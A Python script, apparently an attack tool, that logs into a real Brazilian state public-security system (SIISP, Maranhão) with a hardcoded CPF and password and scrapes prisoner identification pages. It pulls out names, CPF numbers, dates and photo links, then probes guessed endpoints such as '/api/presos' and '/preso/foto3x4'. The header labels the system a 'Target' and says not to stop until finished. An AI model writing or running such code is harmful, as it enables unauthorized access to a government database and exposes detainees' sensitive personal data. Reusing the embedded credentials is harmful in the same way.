#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP Connector - Sistema Integrado de Informações de Segurança Pública
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Detalhe: URL com "preso" = consulta nacional de detentos
Ordem: SÓ PARAR QUANDO FINALIZADO
"""

import requests
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import json
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIG
BASE_URL = "https://siisp.ma.gov.br/SIISP"
TARGET_URL = "https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa"
CPF = "035.176.123-32"
SENHA = "marlon89"

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def print_section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def print_response(r, label=""):
    print(f"\n--- {label} ---")
    print(f"Status: {r.status_code}")
    print(f"URL: {r.url}")
    print(f"Content-Type: {r.headers.get('Content-Type', 'N/A')}")
    print(f"Content-Length: {len(r.text)}")
    print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'N/A')}")
    print(f"Location: {r.headers.get('Location', 'N/A')}")
    # Print cookies
    print(f"Session Cookies: {dict(session.cookies)}")

# ==================== FASE 1: GET LOGIN PAGE (EXTRACT VIEWSTATE) ====================
print_section("FASE 1: RECONHECIMENTO - Extrair ViewState JSF")

login_url = f"{BASE_URL}/login"
print(f"\n[*] GET {login_url}")
r1 = session.get(login_url, allow_redirects=True, timeout=30)
print_response(r1, "Login page")

soup = BeautifulSoup(r1.text, "html.parser")

# Extract ViewState
viewstate = None
vs_input = soup.find("input", {"name": "javax.faces.ViewState"})
if vs_input:
    viewstate = vs_input.get("value", "")
    print(f"\n[+] ViewState encontrado: {viewstate}")
else:
    print(f"\n[-] ViewState NAO encontrado! Verificando outros campos...")
    # Try by id
    vs_input = soup.find("input", {"id": re.compile("ViewState")})
    if vs_input:
        viewstate = vs_input.get("value", "")
        print(f"\n[+] ViewState encontrado por ID: {viewstate}")

# Extract form fields
form = soup.find("form", {"id": "form"})
if form:
    print(f"\n[*] Form 'form' encontrado")
    print(f"  action={form.get('action', '')}")
    print(f"  method={form.get('method', 'POST')}")
else:
    print(f"\n[-] Form 'form' nao encontrado")
    # List all forms
    forms = soup.find_all("form")
    for i, f in enumerate(forms):
        print(f"  Form {i}: id={f.get('id','')}, name={f.get('name','')}, action={f.get('action','')}")

# ==================== FASE 2: LOGIN COM VIEWSTATE ====================
print_section("FASE 2: LOGIN COM VIEWSTATE E BOTAO JSF")

# JSF login requires the button to be "clicked" - we send the button ID
# PrimeFaces button: btLogin
login_data = {
    "form": "form",
    "cpf": CPF,
    "senha": SENHA,
    "javax.faces.ViewState": viewstate,
    "btLogin": "",  # This simulates the button click
}

# Some JSF apps need the button name as the "source" parameter
# Let's try with proper JSF format
login_data_v2 = {
    "form": "form",
    "cpf": CPF,
    "senha": SENHA,
    "javax.faces.ViewState": viewstate,
    "btLogin": "btLogin",  # JSF source component
}

print(f"\n[*] POST {login_url} com credenciais + ViewState")
print(f"  CPF: {CPF}")
print(f"  Senha: {'*' * len(SENHA)}")
print(f"  ViewState: {viewstate}")

r2 = session.post(login_url, data=login_data_v2, allow_redirects=True, timeout=30)
print_response(r2, "POST login JSF")

# Check if login succeeded
is_login_page = ("login" in r2.url.lower() or 
                 "invalid" in r2.url.lower() or
                 "cpf" in r2.text.lower() and "senha" in r2.text.lower())

if is_login_page:
    print(f"\n[-] Ainda na pagina de login - credenciais podem estar erradas")
    print(f"\n[*] Verificando mensagem de erro...")
    
    # Check for error messages
    if "inválido" in r2.text.lower() or "invalid" in r2.text.lower() or "erro" in r2.text.lower():
        print(f"  [X] Detectada mensagem de erro de autenticacao")
    
    # Check if there's a different login URL
    soup2 = BeautifulSoup(r2.text, "html.parser")
    forms2 = soup2.find_all("form")
    for f in forms2:
        action = f.get("action", "")
        if action:
            print(f"\n  Form action: {action}")
    
    # Try alternate login method - maybe the button needs different params
    print(f"\n[*] Tentando login com parametros alternativos...")
    
    # Some JSF apps need the button as the submit source
    login_data_v3 = {
        "form": "form",
        "cpf": CPF,
        "senha": SENHA,
        "javax.faces.ViewState": viewstate,
        "btLogin": "btLogin",
        "javax.faces.source": "btLogin",
        "javax.faces.partial.ajax": "true",
        "javax.faces.partial.execute": "@all",
        "javax.faces.partial.render": "@all",
    }
    
    r2_alt = session.post(login_url, data=login_data_v3, allow_redirects=True, timeout=30)
    print_response(r2_alt, "POST login JSF v2 (ajax)")
    
    if "login" not in r2_alt.url.lower():
        print(f"\n[+] LOGIN BEM-SUCEDIDO com AJAX! URL: {r2_alt.url}")
        r2 = r2_alt
    else:
        print(f"\n[-] Login AJAX tambem falhou")
        
        # Try yet another method - raw form with just button
        login_data_v4 = {
            "form": "form",
            "cpf": CPF,
            "senha": SENHA,
            "javax.faces.ViewState": viewstate,
        }
        
        # Make the button the actual submit
        r2_alt2 = session.post(login_url, data=login_data_v4, allow_redirects=True, timeout=30)
        print_response(r2_alt2, "POST login JSF v3 (simple)")
        
        if "login" not in r2_alt2.url.lower():
            print(f"\n[+] LOGIN BEM-SUCEDIDO com form simples! URL: {r2_alt2.url}")
            r2 = r2_alt2
        else:
            print(f"\n[-] Todos os metodos de login falharam")
            
            # Check if there's a specific error message
            if "CPF" in r2_alt2.text and "não encontrado" in r2_alt2.text:
                print(f"\n[X] CPF nao encontrado no sistema")
            elif "senha" in r2_alt2.text.lower() and "incorret" in r2_alt2.text.lower():
                print(f"\n[X] Senha incorreta")
            else:
                print(f"\n[!] Erro desconhecido - verifique siisp_response.html")
            
            with open("siisp_response.html", "w", encoding="utf-8") as f:
                f.write(r2_alt2.text)
            
            print(f"\n{'='*60}")
            print(f"  LOGIN FALHOU - TENTANDO ALTERNATIVAS")
            print(f"{'='*60}")
else:
    print(f"\n[+] LOGIN BEM-SUCEDIDO! URL: {r2.url}")

# ==================== FASE 3: ACESSAR PAGINA DE IDENTIFICACAO ====================
print_section("FASE 3: ACESSAR PAGINA DE IDENTIFICACAO")

print(f"\n[*] GET {TARGET_URL}")
r3 = session.get(TARGET_URL, allow_redirects=True, timeout=30)
print_response(r3, "GET identificacaoPessoa")

if "identificacaoPessoa" in r3.url or "preso" in r3.url:
    print(f"\n[+] PAGINA DE IDENTIFICACAO ACESSADA!")
    
    # Parse the page
    soup3 = BeautifulSoup(r3.text, "html.parser")
    
    # Save full response
    with open("siisp_identificacao.html", "w", encoding="utf-8") as f:
        f.write(r3.text)
    print(f"\n[+] HTML salvo em: siisp_identificacao.html")
    
    # Extract form fields
    forms3 = soup3.find_all("form")
    print(f"\n[*] Forms: {len(forms3)}")
    
    # Extract all input fields
    inputs = soup3.find_all("input")
    print(f"\n[*] Inputs: {len(inputs)}")
    for inp in inputs:
        name = inp.get("name", "")
        id_ = inp.get("id", "")
        value = inp.get("value", "")
        if name:
            print(f"  {name}: {value}")
    
    # Extract tables
    tables = soup3.find_all("table")
    print(f"\n[*] Tabelas: {len(tables)}")
    
    # Extract data from tables
    for i, table in enumerate(tables):
        rows = table.find_all("tr")
        print(f"\n  Tabela {i}: {len(rows)} linhas")
        for row in rows[:5]:  # First 5 rows
            cells = row.find_all(["td", "th"])
            data = [cell.get_text(strip=True) for cell in cells]
            if data:
                print(f"    {data}")
    
    # Extract all links
    links = soup3.find_all("a", href=True)
    print(f"\n[*] Links: {len(links)}")
    for link in links[:10]:
        href = link.get("href", "")
        text = link.get_text(strip=True)
        if href and href.startswith("/"):
            print(f"  {text}: {href}")
    
    # Look for image/foto links
    fotos = []
    for img in soup3.find_all("img"):
        src = img.get("src", "")
        if src and ("foto" in src.lower() or "image" in src.lower() or "img" in src.lower()):
            fotos.append(src)
    print(f"\n[*] Imagens encontradas: {len(fotos)}")
    for f in fotos:
        print(f"  {f}")
    
    # Extract any data display areas
    divs = soup3.find_all("div", class_=True)
    print(f"\n[*] Divs com classe: {len(divs)}")
    
    # Look for specific data fields
    pessoa_data = {}
    for inp in inputs:
        name = inp.get("name", "")
        if name and ("nome" in name.lower() or "data" in name.lower() or "cpf" in name.lower() or "rg" in name.lower() or "matricula" in name.lower()):
            pessoa_data[name] = inp.get("value", "")
    
    if pessoa_data:
        print(f"\n[+] DADOS PESSOA ENCONTRADOS:")
        for k, v in pessoa_data.items():
            print(f"  {k}: {v}")
    
else:
    print(f"\n[-] Ainda na pagina de login ou redirect")
    print(f"  URL: {r3.url}")
    
    # Check if we got redirected to a different page
    if "home" in r3.url.lower() or "dashboard" in r3.url.lower() or "principal" in r3.url.lower():
        print(f"\n[+] Login parece ter funcionado! Redirect para: {r3.url}")
        
        # Try to navigate to the target from the home page
        print(f"\n[*] Navegando para target a partir da home...")
        r3_retry = session.get(TARGET_URL, allow_redirects=True, timeout=30)
        print_response(r3_retry, "GET target retry")
        
        if "identificacao" in r3_retry.text.lower():
            print(f"\n[+] PAGINA DE IDENTIFICACAO ENCONTRADA!")
            with open("siisp_identificacao.html", "w", encoding="utf-8") as f:
                f.write(r3_retry.text)
        else:
            print(f"\n[-] Ainda nao acessou a pagina de identificacao")

# ==================== FASE 4: EXTRAIR DADOS ====================
print_section("FASE 4: EXTRAIR DADOS DA PAGINA")

try:
    with open("siisp_identificacao.html", "r", encoding="utf-8") as f:
        html = f.read()
    
    soup4 = BeautifulSoup(html, "html.parser")
    
    # Try to find and extract all data
    print(f"\n[*] Buscando todos os dados na pagina...")
    
    # Method 1: Look for label-value pairs
    labels = soup4.find_all("label")
    print(f"\n[*] Labels: {len(labels)}")
    for label in labels[:10]:
        text = label.get_text(strip=True)
        # Try to find associated input
        for_attr = label.get("for", "")
        if for_attr:
            inp = soup4.find(id=for_attr)
            if inp:
                value = inp.get("value", "") or inp.get_text(strip=True)
                print(f"  {text}: {value}")
    
    # Method 2: Look for data in specific divs
    print(f"\n[*] Buscando divs de dados...")
    for div in soup4.find_all("div", class_=re.compile("(dados|pessoa|info|data|field)")):
        text = div.get_text(strip=True)
        if text:
            print(f"  {text[:100]}")
    
    # Method 3: Look for any text that might contain person data
    print(f"\n[*] Buscando textos com dados pessoais...")
    text = soup4.get_text()
    
    # Look for names (common patterns)
    nome_patterns = re.findall(r'(?:Nome|nome|NOME)[\s:=]+([^\n<]+)', text)
    if nome_patterns:
        print(f"\n[+] NOMES ENCONTRADOS:")
        for n in nome_patterns[:5]:
            print(f"  {n.strip()}")
    
    # Look for CPFs
    cpf_patterns = re.findall(r'\d{3}\.\d{3}\.\d{3}-\d{2}', text)
    if cpf_patterns:
        print(f"\n[+] CPFS ENCONTRADOS:")
        for c in set(cpf_patterns):
            print(f"  {c}")
    
    # Look for dates
    data_patterns = re.findall(r'\d{2}/\d{2}/\d{4}', text)
    if data_patterns:
        print(f"\n[+] DATAS ENCONTRADAS:")
        for d in list(set(data_patterns))[:5]:
            print(f"  {d}")
    
    # Look for any structured data
    print(f"\n[*] Extraindo JSON/JS do HTML...")
    scripts = soup4.find_all("script")
    for script in scripts:
        content = script.get_text()
        # Look for JSON data
        if "var" in content or "const" in content or "let" in content:
            json_matches = re.findall(r'(?:var|const|let)\s+(\w+)\s*=\s*(\{.*?\}|\[.*?\]);', content, re.DOTALL)
            for var_name, var_data in json_matches[:3]:
                print(f"  Variavel {var_name}: {var_data[:200]}")
    
except FileNotFoundError:
    print(f"\n[-] Arquivo siisp_identificacao.html nao encontrado")

# ==================== FASE 5: TENTAR ENDPOINTS ALTERNATIVOS ====================
print_section("FASE 5: TENTAR ENDPOINTS ALTERNATIVOS")

endpoints = [
    "/preso/identificacaoPessoa",
    "/preso/dadosPessoa",
    "/preso/foto",
    "/preso/foto3x4",
    "/preso/dadosBasicos",
    "/preso/dadosCompletos",
    "/api/pessoa",
    "/api/presos",
    "/api/identificacao",
    "/api/dados",
    "/api/foto",
    "/api/foto3x4",
    "/rest/pessoa",
    "/rest/presos",
    "/rest/identificacao",
    "/service/pessoa",
    "/service/presos",
]

for ep in endpoints:
    url = f"{BASE_URL}{ep}"
    try:
        r = session.get(url, allow_redirects=True, timeout=10)
        size = len(r.text)
        if r.status_code == 200 and size > 500 and "login" not in r.url.lower():
            print(f"  [+] {ep} -> {r.status_code} ({size} bytes) - {r.url}")
            # Save
            with open(f"siisp_{ep.replace('/','_').replace(':','_')}.html", "w", encoding="utf-8") as f:
                f.write(r.text)
        elif r.status_code == 200:
            print(f"  [~] {ep} -> {r.status_code} ({size} bytes) - possivel login page")
        else:
            print(f"  [-] {ep} -> {r.status_code}")
    except Exception as e:
        print(f"  [X] {ep} -> ERRO: {str(e)[:40]}")

print(f"\n{'='*60}")
print(f"  FIM DA CONEXAO")
print(f"{'='*60}")
